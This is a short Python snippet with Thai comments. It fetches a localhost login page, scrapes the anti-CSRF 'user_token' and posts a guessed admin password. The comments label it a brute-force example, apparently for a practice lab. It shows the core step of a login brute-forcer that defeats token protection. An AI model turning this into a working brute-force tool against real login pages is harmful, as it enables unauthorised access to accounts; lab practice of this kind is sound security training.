import requests
from bs4 import BeautifulSoup

session = requests.Session()
# 1. ไปหน้า Login เพื่อเอา Cookie และ Token แรก
response = session.get("http://localhost/login.php")
soup = BeautifulSoup(response.text, 'html.parser')
token = soup.find('input', {'name': 'user_token'})['value']

# 2. ลอง Brute Force (ตัวอย่าง)
payload = {
    'username': 'admin',
    'password': 'password123',
    'Login': 'Login',
    'user_token': token # ส่ง token ที่ดึงมาสดๆ ไปด้วย
}
post_res = session.post("http://localhost/login.php", data=payload)